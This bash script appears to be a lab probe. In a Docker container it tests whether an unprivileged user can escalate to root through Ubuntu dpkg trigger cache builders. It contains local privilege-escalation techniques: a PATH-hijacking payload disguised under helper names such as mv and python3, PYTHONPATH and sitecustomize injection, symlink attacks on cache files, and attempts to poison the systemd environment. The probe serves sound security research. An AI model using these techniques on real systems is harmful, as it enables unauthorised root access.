#!/usr/bin/env bash
set -Eeuo pipefail

TARGET="${1:-${TARGET:-ubuntu24-server-lpe-target}}"
ATTACKER="${ATTACKER:-attacker}"

SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
WORKSPACE="$(cd -- "$SCRIPT_DIR/.." && pwd)"
LOG="${LOG:-$WORKSPACE/logs/misc-cache-builders.out}"

mkdir -p "$(dirname -- "$LOG")"
: > "$LOG"
exec > >(tee -a "$LOG") 2>&1

section() {
  printf '\n## %s\n' "$1"
}

target_root() {
  local label="$1"
  section "$label"
  printf '$ docker exec -i %q bash -s\n' "$TARGET"
  docker exec -i -e ATTACKER="$ATTACKER" "$TARGET" bash -s
}

target_attacker() {
  local label="$1"
  section "$label"
  printf '$ docker exec -i %q runuser -u %q -- bash -s\n' "$TARGET" "$ATTACKER"
  docker exec -i -e ATTACKER="$ATTACKER" "$TARGET" runuser -u "$ATTACKER" -- bash -s
}

if [[ "$(docker inspect -f '{{.State.Running}}' "$TARGET" 2>/dev/null || true)" != "true" ]]; then
  echo "target container is not running: $TARGET" >&2
  exit 1
fi

echo "misc cache builder trigger trust-boundary probe"
echo "target=$TARGET attacker=$ATTACKER"
date '+%Y-%m-%dT%H:%M:%S%z'

target_root "cleanup before probe" <<'TARGET'
set +e
probe=misc_cache_builders_probe
rm -rf "/home/${ATTACKER}/${probe}" /tmp/${probe}* /root/${probe}* 2>/dev/null || true
rm -f /var/lib/xml-core/_tmp_${probe}* /var/lib/xml-core/_home_${ATTACKER}_${probe}* 2>/dev/null || true
systemctl reset-failed >/dev/null 2>&1 || true
true
TARGET

target_root "target, package, and helper proof" <<'TARGET'
set +e
cat /etc/os-release
uname -a
ps -p 1 -o pid=,user=,comm=,args=
id "$ATTACKER"
runuser -u "$ATTACKER" -- bash -lc 'id; groups; command -v sudo >/dev/null && sudo -n true; echo sudo_rc=$?' 2>&1

echo
echo "== installed/default package versions =="
dpkg-query -W -f='${binary:Package}\t${Status}\t${Version}\n' \
  info install-info shared-mime-info media-types mime-support sgml-base xml-core \
  libglib2.0-0t64 libglib2.0-bin debianutils python3-twisted \
  fontconfig desktop-file-utils hicolor-icon-theme xdg-utils mailcap 2>&1 | sort

echo
echo "== helper paths =="
for c in update-info-dir install-info update-mime-database update-xmlcatalog update-catalog \
  glib-compile-schemas gio-querymodules update-shells dpkg-trigger py3versions python3 \
  fc-cache gtk-update-icon-cache update-desktop-database run-mailcap; do
  printf '%-28s ' "$c"
  command -v "$c" 2>/dev/null || echo MISSING
done
for p in /usr/lib/aarch64-linux-gnu/glib-2.0/glib-compile-schemas \
  /usr/lib/aarch64-linux-gnu/glib-2.0/gio-querymodules; do
  [ -e "$p" ] && ls -l "$p" || echo "MISSING $p"
done
TARGET

target_root "default triggers and vulnerable-code candidates" <<'TARGET'
set +e
echo "== relevant dpkg trigger registrations =="
grep -nE '(/usr/share/info|/usr/share/mime/packages|update-sgmlcatalog|/etc/sgml|/usr/share/sgml|/usr/share/xml|/usr/share/glib-2.0/schemas|/usr/lib/aarch64-linux-gnu/gio/modules|/usr/share/debianutils/shells.d|twisted-plugins-cache)' \
  /var/lib/dpkg/triggers/File /var/lib/dpkg/triggers/update-sgmlcatalog /var/lib/dpkg/triggers/twisted-plugins-cache 2>/dev/null || true
for f in /var/lib/dpkg/info/install-info.triggers \
  /var/lib/dpkg/info/shared-mime-info.triggers \
  /var/lib/dpkg/info/sgml-base.triggers \
  /var/lib/dpkg/info/xml-core.triggers \
  /var/lib/dpkg/info/libglib2.0-0t64:arm64.triggers \
  /var/lib/dpkg/info/debianutils.triggers \
  /var/lib/dpkg/info/python3-twisted.triggers; do
  echo "### $f"
  [ -e "$f" ] && nl -ba "$f" || echo MISSING
done

echo
echo "== maintainer scripts and helper lines =="
for f in /var/lib/dpkg/info/install-info.postinst \
  /usr/sbin/update-info-dir \
  /var/lib/dpkg/info/shared-mime-info.postinst \
  /var/lib/dpkg/info/sgml-base.postinst \
  /usr/sbin/update-catalog \
  /usr/sbin/update-xmlcatalog \
  /var/lib/dpkg/info/libglib2.0-0t64:arm64.postinst \
  /var/lib/dpkg/info/debianutils.postinst \
  /usr/sbin/update-shells \
  /var/lib/dpkg/info/python3-twisted.postinst \
  /usr/lib/python3/dist-packages/twisted/plugin.py; do
  echo "### $f"
  if [ -e "$f" ]; then
    stat -Lc '%A %a %U:%G %n' "$f"
    nl -ba "$f" | grep -E 'update-info-dir|install-info|update-mime-database|which |update-catalog|dpkg-trigger|update-xmlcatalog|glib-compile-schemas|gio-querymodules|update-shells|dpkg-realpath|mv |sync|py3versions|python3|dropin.cache|getPlugins|load\(|open\(|rename|/usr/share|/etc/sgml|/var/lib|PATH|system\(' | sed -n '1,180p'
  else
    echo MISSING
  fi
done
TARGET

target_root "default filesystem trust boundaries" <<'TARGET'
set +e
echo "== input/output path ownership =="
paths="/usr/share/info /usr/share/info/dir /usr/share/info/dir.old /usr/share/mime /usr/share/mime/packages /usr/share/mime/mime.cache /usr/share/xml /etc/xml /etc/xml/catalog /var/lib/xml-core /usr/share/sgml /etc/sgml /etc/sgml/catalog /var/lib/sgml-base /var/lib/sgml-base/supercatalog /usr/share/glib-2.0/schemas /usr/share/glib-2.0/schemas/gschemas.compiled /usr/lib/aarch64-linux-gnu/gio/modules /usr/lib/aarch64-linux-gnu/gio/modules/giomodule.cache /usr/share/debianutils/shells.d /etc/shells /var/lib/shells.state /usr/lib/python3/dist-packages/twisted/plugins /usr/lib/python3/dist-packages/twisted/plugins/dropin.cache /usr/share/icons/hicolor /usr/share/applications /usr/local/share/info /usr/local/share/mime /usr/local/share/xml /usr/local/share/sgml /usr/local/share/glib-2.0/schemas /usr/local/share/applications /usr/local/share/icons"
for p in $paths; do
  if [ -e "$p" ] || [ -L "$p" ]; then
    stat -Lc '%A %a %U:%G %F %n -> %N' "$p"
  else
    echo "MISSING $p"
  fi
done

echo
echo "== representative contents =="
find /usr/share/info /usr/share/mime/packages /etc/xml /var/lib/xml-core /etc/sgml /var/lib/sgml-base \
  /usr/share/glib-2.0/schemas /usr/lib/aarch64-linux-gnu/gio/modules \
  /usr/share/debianutils/shells.d /usr/lib/python3/dist-packages/twisted/plugins \
  /usr/share/icons/hicolor /usr/share/applications -maxdepth 1 \
  -printf '%M %u:%g %s %p -> %l\n' 2>/dev/null | sort | sed -n '1,260p'

echo
echo "== attacker writability checks =="
runuser -u "$ATTACKER" -- bash -s <<'ATTACKER'
set +e
id
paths="/usr/share/info /usr/share/info/dir /usr/share/mime/packages /usr/share/mime/mime.cache /usr/share/xml /etc/xml /etc/xml/catalog /var/lib/xml-core /usr/share/sgml /etc/sgml /var/lib/sgml-base /usr/share/glib-2.0/schemas /usr/lib/aarch64-linux-gnu/gio/modules /usr/share/debianutils/shells.d /etc/shells /var/lib/shells.state /usr/lib/python3/dist-packages/twisted/plugins /usr/lib/python3/dist-packages/twisted/plugins/dropin.cache /usr/share/icons/hicolor /usr/share/applications /usr/local/share /usr/local/share/info /usr/local/share/mime /usr/local/share/xml /usr/local/share/sgml /usr/local/share/glib-2.0 /usr/local/share/applications /usr/local/share/icons /tmp /var/tmp"
for p in $paths; do
  if [ -e "$p" ] || [ -L "$p" ]; then
    if [ -w "$p" ]; then echo "W $p"; else echo "NO_W $p"; fi
  else
    parent="$(dirname "$p")"
    if [ -w "$parent" ]; then echo "MISSING_PARENT_W $p"; else echo "MISSING_PARENT_NO_W $p"; fi
  fi
done
ATTACKER
TARGET

target_attacker "attacker setup, write attempts, and direct helper execution" <<'ATTACKER'
set +e
probe=misc_cache_builders_probe
base="$HOME/$probe"
hits="/tmp/${probe}.helper_hits"
rm -rf "$base" "$hits"
mkdir -p "$base/bin" "$base/info" "$base/mime/packages" "$base/xml" "$base/sgml" \
  "$base/schemas" "$base/gio/modules" "$base/root/etc" "$base/root/var/lib" \
  "$base/root/usr/share/debianutils/shells.d" "$base/root/usr/share/debianutils" \
  "$base/py/twisted/plugins"

cat > "$base/bin/payload" <<'PAYLOAD'
#!/usr/bin/env bash
name="$(basename "$0")"
{
  echo "helper=$name uid=$(id -u) euid=$(id -u) args=$*"
  id
  env | grep -E '^(PATH|PYTHONPATH|PERL5LIB|HOME|USER|TMPDIR)=' || true
  echo '---'
} >> /tmp/misc_cache_builders_probe.helper_hits
if [ "$(id -u)" = 0 ]; then
  {
    echo "ROOT_HELPER_HIT $name"
    id
    echo "args=$*"
  } >> /root/misc_cache_builders_probe_root_marker 2>/dev/null || true
fi
case "$name" in
  dpkg-realpath) exec /usr/bin/dpkg-realpath "$@" ;;
  which) exec /usr/bin/which "$@" ;;
  python3) exec /usr/bin/python3 "$@" ;;
  py3versions) exec /usr/bin/py3versions "$@" ;;
  chmod|chown|sync|mv|rm|cp|ln|mkdir|touch) exec "/usr/bin/$name" "$@" 2>/dev/null || exec "/bin/$name" "$@" 2>/dev/null ;;
  *) exit 0 ;;
esac
PAYLOAD
chmod 755 "$base/bin/payload"
for h in install-info update-mime-database update-info-dir update-catalog update-xmlcatalog \
  glib-compile-schemas gio-querymodules update-shells dpkg-trigger dpkg-realpath which \
  python3 py3versions chmod chown sync mv rm cp ln mkdir touch; do
  ln -sf payload "$base/bin/$h"
done

cat > "$base/info/probe.info" <<'EOF'
INFO-DIR-SECTION Miscellaneous
START-INFO-DIR-ENTRY
* probe: (probe). Probe entry.
END-INFO-DIR-ENTRY
EOF

cat > "$base/mime/packages/probe.xml" <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<mime-info xmlns="http://www.freedesktop.org/standards/shared-mime-info">
  <mime-type type="application/x-codex-misc-cache-probe">
    <comment>Codex cache probe</comment>
    <glob pattern="*.codex-misc-cache-probe"/>
  </mime-type>
</mime-info>
EOF

cat > "$base/xml/local.xml" <<'EOF'
<?xml version="1.0"?>
<!DOCTYPE catalog PUBLIC "-//OASIS//DTD Entity Resolution XML Catalog V1.0//EN"
  "http://www.oasis-open.org/committees/entity/release/1.0/catalog.dtd">
<catalog xmlns="urn:oasis:names:tc:entity:xmlns:xml:catalog"/>
EOF
printf '<probe/>\n' > "$base/xml/file.xml"
printf 'CATALOG %s\n' "$base/sgml/ordinary.cat" > "$base/sgml/catalog"
printf '%s\n' '--' '--' > "$base/sgml/ordinary.cat"

cat > "$base/schemas/org.codex.misc.gschema.xml" <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<schemalist>
  <schema id="org.codex.misc" path="/org/codex/misc/">
    <key name="enabled" type="b">
      <default>false</default>
      <summary>Probe</summary>
      <description>Probe schema.</description>
    </key>
  </schema>
</schemalist>
EOF

printf '/bin/sh\n' > "$base/root/usr/share/debianutils/shells"
printf '/tmp/misc-cache-probe-shell\n' > "$base/root/usr/share/debianutils/shells.d/probe"
cat > "$base/py/twisted/plugins/codex_probe.py" <<'EOF'
from pathlib import Path
Path("/tmp/misc_cache_builders_probe.twisted_user").write_text("uid-user\n")
EOF
cat > "$base/py/sitecustomize.py" <<'EOF'
from pathlib import Path
Path("/tmp/misc_cache_builders_probe.python_sitecustomize").write_text("uid-user\n")
EOF

try_file() {
  local p="$1"
  printf 'write %s -> ' "$p"
  if bash -c 'printf "probe\n" > "$1"' bash "$p" 2>"$base/write.err"; then
    echo OK
    rm -f "$p"
  else
    sed -n '1p' "$base/write.err"
  fi
  rm -f "$base/write.err"
}

try_link() {
  local p="$1"
  printf 'symlink %s -> ' "$p"
  if ln -s /root/misc_cache_builders_probe_link_target "$p" 2>"$base/link.err"; then
    echo OK
    rm -f "$p"
  else
    sed -n '1p' "$base/link.err"
  fi
  rm -f "$base/link.err"
}

echo "== write and symlink placement attempts in default roots =="
for p in \
  /usr/share/info/codex-probe.info \
  /usr/share/info/dir \
  /usr/share/mime/packages/codex-probe.xml \
  /usr/share/mime/mime.cache \
  /usr/share/xml/codex-probe.xml \
  /etc/xml/catalog \
  /var/lib/xml-core/codex-probe \
  /usr/share/sgml/codex-probe.cat \
  /etc/sgml/codex-probe.cat \
  /var/lib/sgml-base/supercatalog \
  /usr/share/glib-2.0/schemas/org.codex.misc.gschema.xml \
  /usr/lib/aarch64-linux-gnu/gio/modules/libcodex-probe.so \
  /usr/share/debianutils/shells.d/codex-probe \
  /etc/shells \
  /var/lib/shells.state \
  /usr/lib/python3/dist-packages/twisted/plugins/codex_probe.py \
  /usr/lib/python3/dist-packages/twisted/plugins/dropin.cache \
  /usr/share/icons/hicolor/codex-probe.png \
  /usr/share/applications/codex-probe.desktop \
  /usr/local/share/info/codex-probe.info \
  /usr/local/share/mime/packages/codex-probe.xml \
  /usr/local/share/glib-2.0/schemas/org.codex.misc.gschema.xml; do
  try_file "$p"
done
for p in \
  /usr/share/info/dir \
  /usr/share/mime/mime.cache \
  /etc/xml/catalog \
  /var/lib/sgml-base/supercatalog \
  /usr/share/glib-2.0/schemas/gschemas.compiled \
  /usr/lib/aarch64-linux-gnu/gio/modules/giomodule.cache \
  /etc/shells \
  /usr/lib/python3/dist-packages/twisted/plugins/dropin.cache; do
  try_link "$p"
done

echo
echo "== attacker direct helper runs with hostile env =="
export PATH="$base/bin:$PATH"
export PYTHONPATH="$base/py"
export TMPDIR="$base/tmp"
mkdir -p "$TMPDIR"

/usr/sbin/update-info-dir "$base/info" 2>&1 | sed -n '1,80p'; echo "attacker_update_info_dir_rc=${PIPESTATUS[0]}"
/usr/bin/update-mime-database "$base/mime" 2>&1 | sed -n '1,80p'; echo "attacker_update_mime_rc=${PIPESTATUS[0]}"
/usr/sbin/update-catalog --add "$base/sgml/catalog" "$base/sgml/ordinary.cat" 2>&1 | sed -n '1,80p'; echo "attacker_update_catalog_add_rc=${PIPESTATUS[0]}"
/usr/sbin/update-catalog --add --super "$base/sgml/catalog" 2>&1 | sed -n '1,80p'; echo "attacker_update_catalog_super_rc=${PIPESTATUS[0]}"
/usr/sbin/update-xmlcatalog --add --local "$base/xml/local.xml" --file "$base/xml/file.xml" --type system --id "codex-probe" 2>&1 | sed -n '1,80p'; echo "attacker_update_xmlcatalog_local_rc=${PIPESTATUS[0]}"
/usr/lib/aarch64-linux-gnu/glib-2.0/glib-compile-schemas "$base/schemas" 2>&1 | sed -n '1,80p'; echo "attacker_glib_compile_schemas_rc=${PIPESTATUS[0]}"
/usr/lib/aarch64-linux-gnu/glib-2.0/gio-querymodules "$base/gio/modules" 2>&1 | sed -n '1,80p'; echo "attacker_gio_querymodules_rc=${PIPESTATUS[0]}"
/usr/sbin/update-shells --root "$base/root" --verbose 2>&1 | sed -n '1,120p'; echo "attacker_update_shells_rc=${PIPESTATUS[0]}"
/usr/bin/python3 -c 'from twisted.plugin import IPlugin, getPlugins; list(getPlugins(IPlugin))' 2>&1 | sed -n '1,80p'; echo "attacker_twisted_cache_rc=${PIPESTATUS[0]}"
/usr/bin/dpkg-trigger --no-await /usr/share/info 2>&1 | sed -n '1,20p'; echo "attacker_dpkg_trigger_info_rc=${PIPESTATUS[0]}"
/usr/bin/dpkg-trigger --no-await twisted-plugins-cache 2>&1 | sed -n '1,20p'; echo "attacker_dpkg_trigger_twisted_rc=${PIPESTATUS[0]}"
/usr/bin/dpkg --triggers-only --pending >/tmp/${probe}.dpkg_pending 2>&1
dpkg_rc=$?
sed -n '1,20p' /tmp/${probe}.dpkg_pending
echo "attacker_dpkg_triggers_pending_rc=$dpkg_rc"

echo
echo "== direct helper hits are attacker-only =="
if [ -e "$hits" ]; then
  sed -n '1,240p' "$hits"
else
  echo NO_HELPER_HITS
fi
find "$base" -maxdepth 4 -printf '%M %u:%g %s %p -> %l\n' 2>/dev/null | sort | sed -n '1,260p'
ATTACKER

target_attacker "attacker attempts to trigger or poison root context" <<'ATTACKER'
set +e
probe=misc_cache_builders_probe
base="$HOME/$probe"
echo "== systemd manager env poisoning attempts =="
systemctl set-environment "PATH=$base/bin:/usr/sbin:/usr/bin:/sbin:/bin" 2>&1 | sed -n '1,10p'
echo "setenv_path_rc=${PIPESTATUS[0]}"
TMPDIR="$base/tmp" systemctl import-environment TMPDIR PATH PYTHONPATH 2>&1 | sed -n '1,10p'
echo "importenv_rc=${PIPESTATUS[0]}"

echo
echo "== no default root units exist for these trigger-only builders =="
for u in install-info.service shared-mime-info.service sgml-base.service xml-core.service \
  glib-compile-schemas.service gio-querymodules.service update-shells.service twisted-plugins-cache.service; do
  systemctl status "$u" --no-pager 2>&1 | sed -n '1,5p'
  echo "status_${u}_rc=${PIPESTATUS[0]}"
done
ATTACKER

target_root "controlled non-default custom-directory sink tests" <<'TARGET'
set +e
probe=misc_cache_builders_probe
base="/tmp/${probe}_custom"
rm -rf "$base"
mkdir -p "$base/info" "$base/mime/packages" "$base/schemas" "$base/gio/modules" \
  "$base/root/etc" "$base/root/var/lib" "$base/root/usr/share/debianutils/shells.d" "$base/root/usr/share/debianutils" \
  "$base/sgml" "$base/victims"
chown -R "$ATTACKER:$ATTACKER" "$base"

runuser -u "$ATTACKER" -- bash -s <<'ATTACKER_SETUP'
set +e
probe=misc_cache_builders_probe
base="/tmp/${probe}_custom"
cat > "$base/info/probe.info" <<'EOF'
INFO-DIR-SECTION Miscellaneous
START-INFO-DIR-ENTRY
* probe: (probe). Probe entry.
END-INFO-DIR-ENTRY
EOF
cat > "$base/mime/packages/probe.xml" <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<mime-info xmlns="http://www.freedesktop.org/standards/shared-mime-info">
  <mime-type type="application/x-codex-custom-root-probe">
    <comment>Probe</comment>
    <glob pattern="*.codex-custom-root-probe"/>
  </mime-type>
</mime-info>
EOF
cat > "$base/schemas/org.codex.custom.gschema.xml" <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<schemalist>
  <schema id="org.codex.custom" path="/org/codex/custom/">
    <key name="enabled" type="b">
      <default>false</default>
      <summary>Probe</summary>
      <description>Probe schema.</description>
    </key>
  </schema>
</schemalist>
EOF
printf '/bin/sh\n' > "$base/root/usr/share/debianutils/shells"
printf '/tmp/custom-shell\n' > "$base/root/usr/share/debianutils/shells.d/probe"
printf 'CATALOG %s\n' "$base/sgml/ordinary.cat" > "$base/sgml/catalog"
printf '%s\n' '--' '--' > "$base/sgml/ordinary.cat"
ln -s "$base/victims/info-dir" "$base/info/dir"
ln -s "$base/victims/mime-cache" "$base/mime/mime.cache"
ln -s "$base/victims/gschemas" "$base/schemas/gschemas.compiled"
ln -s "$base/victims/giomodule-cache" "$base/gio/modules/giomodule.cache"
ln -s "$base/victims/etc-shells" "$base/root/etc/shells"
ln -s "$base/victims/sgml-catalog" "$base/sgml/catalog-symlink"
ATTACKER_SETUP

echo "== custom tree before root helpers =="
find "$base" -maxdepth 4 -printf '%M %u:%g %s %p -> %l\n' 2>/dev/null | sort | sed -n '1,260p'

echo
echo "== root helpers on attacker-owned custom paths (not default reachability) =="
env -i PATH=/usr/sbin:/usr/bin:/sbin:/bin /usr/sbin/update-info-dir "$base/info" 2>&1 | sed -n '1,80p'
echo "root_custom_update_info_rc=${PIPESTATUS[0]}"
env -i PATH=/usr/sbin:/usr/bin:/sbin:/bin /usr/bin/update-mime-database "$base/mime" 2>&1 | sed -n '1,80p'
echo "root_custom_update_mime_rc=${PIPESTATUS[0]}"
env -i PATH=/usr/sbin:/usr/bin:/sbin:/bin /usr/lib/aarch64-linux-gnu/glib-2.0/glib-compile-schemas "$base/schemas" 2>&1 | sed -n '1,80p'
echo "root_custom_glib_schema_rc=${PIPESTATUS[0]}"
env -i PATH=/usr/sbin:/usr/bin:/sbin:/bin /usr/lib/aarch64-linux-gnu/glib-2.0/gio-querymodules "$base/gio/modules" 2>&1 | sed -n '1,80p'
echo "root_custom_gio_modules_rc=${PIPESTATUS[0]}"
env -i PATH=/usr/sbin:/usr/bin:/sbin:/bin /usr/sbin/update-shells --root "$base/root" --verbose 2>&1 | sed -n '1,120p'
echo "root_custom_update_shells_rc=${PIPESTATUS[0]}"
env -i PATH=/usr/sbin:/usr/bin:/sbin:/bin /usr/sbin/update-catalog --add "$base/sgml/catalog-symlink" "$base/sgml/ordinary.cat" 2>&1 | sed -n '1,120p'
echo "root_custom_update_catalog_rc=${PIPESTATUS[0]}"

echo
echo "== custom tree after root helpers =="
find "$base" -maxdepth 4 -printf '%M %u:%g %s %p -> %l\n' 2>/dev/null | sort | sed -n '1,320p'
echo "note: these custom-path root writes require root to choose an attacker-owned directory; stock triggers use fixed root-owned directories."
TARGET

target_root "default root trigger simulations after attacker setup" <<'TARGET'
set +e
probe=misc_cache_builders_probe
backup="/tmp/${probe}_backup"
rm -rf "$backup"
mkdir -p "$backup/rootfs"
state="$backup/state"
: > "$state"
files="/usr/share/info/dir /usr/share/info/dir.old /usr/share/mime/aliases /usr/share/mime/generic-icons /usr/share/mime/globs /usr/share/mime/globs2 /usr/share/mime/icons /usr/share/mime/magic /usr/share/mime/mime.cache /usr/share/mime/subclasses /usr/share/mime/treemagic /usr/share/mime/types /usr/share/mime/version /usr/share/mime/XMLnamespaces /etc/xml/catalog /etc/xml/catalog.old /var/lib/xml-core/catalog /var/lib/xml-core/xml-core /var/lib/xml-core/polkitd /etc/sgml/catalog /var/lib/sgml-base/supercatalog /var/lib/sgml-base/supercatalog.old /usr/share/glib-2.0/schemas/gschemas.compiled /usr/lib/aarch64-linux-gnu/gio/modules/giomodule.cache /etc/shells /var/lib/shells.state /usr/lib/python3/dist-packages/twisted/plugins/dropin.cache"
for p in $files; do
  if [ -e "$p" ] || [ -L "$p" ]; then
    echo "present $p" >> "$state"
    mkdir -p "$backup/rootfs$(dirname "$p")"
    cp -a "$p" "$backup/rootfs$p" 2>/dev/null || true
  else
    echo "absent $p" >> "$state"
  fi
done

rm -f "/tmp/${probe}.helper_hits" "/root/${probe}_root_marker"

echo "== root trigger scripts with clean default-like env =="
clean='PATH=/usr/sbin:/usr/bin:/sbin:/bin HOME=/root SHELL=/bin/sh LOGNAME=root'
env -i $clean /var/lib/dpkg/info/install-info.postinst triggered /usr/share/info 2>&1 | sed -n '1,120p'
echo "root_install_info_trigger_rc=${PIPESTATUS[0]}"
env -i $clean /var/lib/dpkg/info/shared-mime-info.postinst triggered /usr/share/mime/packages 2>&1 | sed -n '1,120p'
echo "root_shared_mime_trigger_rc=${PIPESTATUS[0]}"
env -i $clean /var/lib/dpkg/info/sgml-base.postinst triggered update-sgmlcatalog 2>&1 | sed -n '1,120p'
echo "root_sgml_base_trigger_rc=${PIPESTATUS[0]}"
env -i $clean /var/lib/dpkg/info/libglib2.0-0t64:arm64.postinst triggered /usr/share/glib-2.0/schemas /usr/lib/aarch64-linux-gnu/gio/modules 2>&1 | sed -n '1,120p'
echo "root_glib_trigger_rc=${PIPESTATUS[0]}"
env -i $clean /var/lib/dpkg/info/debianutils.postinst triggered /usr/share/debianutils/shells.d 2>&1 | sed -n '1,120p'
echo "root_debianutils_trigger_rc=${PIPESTATUS[0]}"
env -i $clean /var/lib/dpkg/info/python3-twisted.postinst triggered twisted-plugins-cache 2>&1 | sed -n '1,120p'
echo "root_twisted_trigger_rc=${PIPESTATUS[0]}"

echo
echo "== root payload/hit check =="
if [ -e "/tmp/${probe}.helper_hits" ]; then
  echo "HELPER_HITS_AFTER_DEFAULT_ROOT_TRIGGERS"
  sed -n '1,240p' "/tmp/${probe}.helper_hits"
else
  echo "NO_HELPER_HITS_AFTER_DEFAULT_ROOT_TRIGGERS"
fi
if [ -e "/root/${probe}_root_marker" ]; then
  echo "ROOT_MARKER_PRESENT"
  cat "/root/${probe}_root_marker"
else
  echo "NO_ROOT_MARKER"
fi

echo
echo "== restoring default cache files touched by trigger simulation =="
while read -r status p; do
  if [ "$status" = present ]; then
    mkdir -p "$(dirname "$p")"
    rm -rf "$p"
    cp -a "$backup/rootfs$p" "$p" 2>/dev/null || true
  else
    rm -rf "$p"
  fi
done < "$state"
rm -rf "$backup"
TARGET

target_root "cleanup after probe and health check" <<'TARGET'
set +e
probe=misc_cache_builders_probe
rm -rf "/home/${ATTACKER}/${probe}" /tmp/${probe}* /root/${probe}* 2>/dev/null || true
rm -f /var/lib/xml-core/_tmp_${probe}* /var/lib/xml-core/_home_${ATTACKER}_${probe}* 2>/dev/null || true
systemctl reset-failed >/dev/null 2>&1 || true
echo "== remaining probe files =="
find "/home/${ATTACKER}" /tmp /root /var/lib/xml-core -maxdepth 2 -name "${probe}*" -printf '%M %u:%g %p -> %l\n' 2>/dev/null | sort || true
echo "== health =="
systemctl is-system-running
systemctl --failed --no-legend | wc -l
TARGET
